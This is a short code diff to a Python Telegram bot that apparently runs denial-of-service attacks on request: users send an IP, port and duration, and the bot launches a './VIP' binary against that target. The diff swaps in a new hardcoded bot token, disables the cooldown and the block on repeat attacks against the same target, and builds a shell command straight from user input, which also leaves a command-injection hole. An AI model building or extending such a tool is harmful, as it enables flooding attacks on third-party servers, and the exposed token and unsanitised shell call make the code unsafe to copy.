@@ -19,7 +19,7 @@ db = client['TEST']
 users_collection = db['VIP']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7831102909:AAF5Hln7lTfNYHAszeAf3Q91sjjyNtqv8-Y'
+TELEGRAM_BOT_TOKEN = '7289992579:AAHIXcVEzHAMTFOOPxSZfTOxRfNHcojzRr0'
 ADMIN_USER_ID =  6135948216
 
 cooldown_dict = {}
@@ -140,10 +140,10 @@ async def attack(update: Update, context: CallbackContext):
                 text=f"*⏳ BHAI RUK JAO {remaining_time}*",
                 parse_mode='Markdown'
             )
-            return
-    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
-        return
+         #   return
+  #  if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
+   #     await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
+   #     return
     cooldown_dict[user_id] = current_time
     if user_id not in user_attack_history:
         user_attack_history[user_id] = set()
@@ -167,7 +167,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./VIP {ip} {port} {duration} VIP",
+            f"./VIP {ip} {port} {duration} 40",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
